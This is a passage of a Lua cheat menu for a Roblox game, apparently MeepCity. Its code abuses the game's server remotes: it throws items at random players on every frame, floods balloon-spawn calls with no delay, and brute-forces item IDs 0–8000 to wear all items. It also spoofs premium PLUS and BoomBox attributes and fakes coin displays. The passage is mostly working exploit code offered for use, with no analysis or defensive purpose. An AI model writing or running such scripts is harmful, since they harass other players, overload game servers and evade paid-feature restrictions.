local Players = game:GetService("Players")
local ThrowItemEvent = ReplicatedStorage.EventConnections.ThrowItem
local RunService = game:GetService("RunService")

local function getRandomPlayer()
    local allPlayers = Players:GetPlayers()
    local randomIndex = math.random(1, #allPlayers)
    local randomPlayer = allPlayers[randomIndex]
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("HumanoidRootPart") then
        return randomPlayer
    else
        return nil
    end
end

local function throwAtRandomPlayer()
    local randomPlayer = getRandomPlayer()
    if randomPlayer then
        local targetPosition = randomPlayer.Character.HumanoidRootPart.Position
        local args = {
            [1] = string.format("[932,[\"%s\",\"%s\",\"%s\"],[\"%s\",\"%s\",\"%s\"],[\"%s\",\"%s\",\"%s\"],75]",
                tostring(targetPosition.X), tostring(targetPosition.Y), tostring(targetPosition.Z),
                tostring(targetPosition.X + 3), tostring(targetPosition.Y + 3), tostring(targetPosition.Z + 3),
                tostring(targetPosition.X - 3), tostring(targetPosition.Y - 3), tostring(targetPosition.Z - 3))
        }
        ThrowItemEvent:FireServer(unpack(args))
    end
end

RunService.Heartbeat:Connect(function()
    for _ = 1, 1 do
        throwAtRandomPlayer()
    end
end)
   end,
})


local Section = Tab:CreateSection("Balloon Spawner")

local Dropdown = Tab:CreateDropdown({
   Name = "Select balloon",  -- Balloon color dropdown
   Options = {"Red", "Blue", "Green", "Purple", "White", "Heart"},  -- Color options
   CurrentOption = {"Red"},  -- Default option
   MultipleOptions = false,  -- Only one option can be selected
   Flag = "BalloonColor",  -- Flag to identify the configuration
   Callback = function(Options)
      -- Update the selected balloon color
      selectedBalloonColor = Options[1]
      print("Selected balloon color: " .. selectedBalloonColor)
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "Start spawning balloon type",  -- Start balloon spawning toggle
   CurrentValue = false,  -- Default value (false = not spawning)
   Flag = "SpawnBalloons",  -- Flag to identify the configuration
   Callback = function(Value)
      -- Update the spawnBalloons state
      spawnBalloons = Value
      print("Spawning balloons: " .. tostring(spawnBalloons))

      if spawnBalloons then
         -- Start balloon spawning in a separate thread
         task.spawn(function()
            while spawnBalloons do
               -- Map the selected balloon color to the balloon IDs
               local balloonID
               if selectedBalloonColor == "Red" then
                  balloonID = 1311
               elseif selectedBalloonColor == "Blue" then
                  balloonID = 1312
               elseif selectedBalloonColor == "Green" then
                  balloonID = 1313
               elseif selectedBalloonColor == "Purple" then
                  balloonID = 1314
               elseif selectedBalloonColor == "White" then
                  balloonID = 1315
               elseif selectedBalloonColor == "Heart" then
                  balloonID = 1039  -- Heart balloon ID
               end

               -- Spawn the selected balloon type
               local args = {
                  [1] = 201,
                  [2] = balloonID,
                  [3] = {}
               }

               local args2 = {
                  [1] = 202
               }

               game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args))
               game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args2))

               task.wait(0)  -- Wait before spawning the next balloon
            end
         end)
      end
   end,
})

local spawnAllBalloons = false -- To control the toggle

local Toggle = Tab:CreateToggle({
   Name = "Spawn all balloons",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
spawnAllBalloons = Value -- Update the toggle state
		print("Spawning all balloons: " .. tostring(spawnAllBalloons))

		if spawnAllBalloons then
			-- Start spawning all balloons in a separate thread
			task.spawn(function()
				while spawnAllBalloons do
					-- Spawn balloon with ID 1311
					local args = {
						[1] = 201,
						[2] = 1311,
						[3] = {}
					}
					local args2 = {
						[1] = 202
					}
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args))
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args2))

					-- Spawn balloon with ID 1312
					args[2] = 1312
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args))
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args2))

					-- Spawn balloon with ID 1313
					args[2] = 1313
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args))
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args2))

					-- Spawn balloon with ID 1314
					args[2] = 1314
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args))
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args2))

					-- Spawn balloon with ID 1315
					args[2] = 1315
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args))
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args2))

					-- Spawn balloon with ID 1039 (new addition)
					args[2] = 1039
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args))
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args2))

					task.wait(0) -- Wait before spawning the next set of balloons
				end
			end)
		end
   end,
})

local Section = Tab:CreateSection("Other")

local Button = Tab:CreateButton({
   Name = "Wear all items (Rejoin to remove them)",
   Callback = function()
 -- Fire the events to spawn fireworks once
      local ReplicatedStorage = game:GetService("ReplicatedStorage")

local function tryID(id)
    print("ID'ler test ediliyor:", id)
    ReplicatedStorage.Connection:InvokeServer(201, id, {})
end

for id = 0, 8000 do
    coroutine.wrap(tryID)(id)  -- Launch each ID attempt in a new coroutine
end
   end,
})

local Button = Tab:CreateButton({
   Name = "Quick access rejoin",
   Callback = function()
 game:GetService("TeleportService"):Teleport(game.PlaceId)
	 wait()
	 
 
 
 wait();
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "Spoof PLUS/BOOMBOX",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
if Value then
			-- When toggle is ON
			game.Players.LocalPlayer:SetAttribute("PLUS", true)
			game.Players.LocalPlayer:SetAttribute("BoomBox", true)
		else
			-- When toggle is OFF
			game.Players.LocalPlayer:SetAttribute("PLUS", false)
			game.Players.LocalPlayer:SetAttribute("BoomBox", false)
		end
   end,
})

local Section = Tab:CreateSection("Visual Only")

local Input = Tab:CreateInput({
   Name = "Meep Coins",
   CurrentValue = "",
   PlaceholderText = "money amount",
   RemoveTextAfterFocusLost = false,
   Flag = "Input1",
   Callback = function(Value)
-- Change the coin amount to the value typed in the textbox
		local coinAmount = tonumber(Value) -- Convert input to a number
		
		-- Ensure the input is a valid number before updating the coin amounts
		if coinAmount then
			game:GetService("Players").LocalPlayer.PlayerGui.MainGui.CoinsContainer.Container.Amount.Text = coinAmount
			game:GetService("Players").SlayerssUnleashedd.PlayerGui.ShopGui.Background.Content.Main.TopContainer.CoinsContainer.TotalCoins.Text = coinAmount
			game:GetService("Players").SlayerssUnleashedd.PlayerGui.ScreenGui.ItemShop.ShopContent.TopBar.ButtonBuyCoins.CoinAmount.Text = coinAmount
		else
			warn("Invalid input! Please enter a valid number.")
		end
   end,
})

local Button = Tab:CreateButton({
   Name = "Infinite Money",
   Callback = function()
game:GetService("Players").LocalPlayer.PlayerGui.MainGui.CoinsContainer.Container.Amount.Text = math.huge
	game:GetService("Players").SlayerssUnleashedd.PlayerGui.ShopGui.Background.Content.Main.TopContainer.CoinsContainer.TotalCoins.Text = math.huge
	game:GetService("Players").SlayerssUnleashedd.PlayerGui.ScreenGui.ItemShop.ShopContent.TopBar.ButtonBuyCoins.CoinAmount.Text = math.huge
   end,
})
